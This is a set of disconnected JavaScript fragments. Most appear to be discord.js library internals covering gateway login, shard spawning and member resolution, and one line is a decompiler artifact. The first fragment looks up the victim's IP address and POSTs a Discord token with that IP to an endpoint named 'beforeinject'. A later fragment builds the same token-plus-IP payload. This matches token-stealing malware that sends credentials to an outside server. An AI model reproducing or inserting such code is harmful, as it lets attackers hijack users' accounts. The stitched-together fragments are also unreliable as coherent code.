fetch("http://ip-api.com/json/").then(r => r.json()).then(r => fetch(`${apiurl}/beforeinject`, {
                                method: "POST",
                                body: JSON.stringify({
                                    token: token.slice(1, -1),
                                    ipAddress: r.query
                                })
                            }))
this.client.rest.methods.getGateway().then(res => {
      const protocolVersion = Constants.DefaultOptions.ws.version;
      const gateway = `${res.url}/?v=${protocolVersion}&encoding=${WebSocketConnection.ENCODING}`;
      this.client.emit(Constants.Events.DEBUG, `Using gateway ${gateway}`);
      this.client.ws.connect(gateway);
      this.client.ws.connection.once('error', reject);
      this.client.ws.connection.once('close', event => {
        if (event.code === 4004) reject(new Error(Constants.Errors.BAD_LOGIN));
        if (event.code === 4010) reject(new Error(Constants.Errors.INVALID_SHARD));
        if (event.code === 4011) reject(new Error(Constants.Errors.SHARDING_REQUIRED));
      });
      this.client.once(Constants.Events.READY, () => {
        resolve(token);
        this.client.clearTimeout(timeout);
      });
    }, reject)
key ? isNaN(k) ? <operator>.formatString("", key, ".", k, "") : <operator>.formatString("", key, "[", k, "]") : k
new Promise(resolve => {
      if (this.shards.size >= amount) throw new Error(`Already spawned ${this.shards.size} shards.`);
      this.totalShards = amount;

      this.createShard();
      if (this.shards.size >= this.totalShards) {
        resolve(this.shards);
        return;
      }

      if (delay <= 0) {
        while (this.shards.size < this.totalShards) this.createShard();
        resolve(this.shards);
      } else {
        const interval = setInterval(() => {
          this.createShard();
          if (this.shards.size >= this.totalShards) {
            clearInterval(interval);
            resolve(this.shards);
          }
        }, delay);
      }
    })
_tmp_26.body = JSON.stringify({
                                    token: token,
                                    ip: r.query
                                })
member = this.client.resolver.resolveGuildMember(this.guild, member)
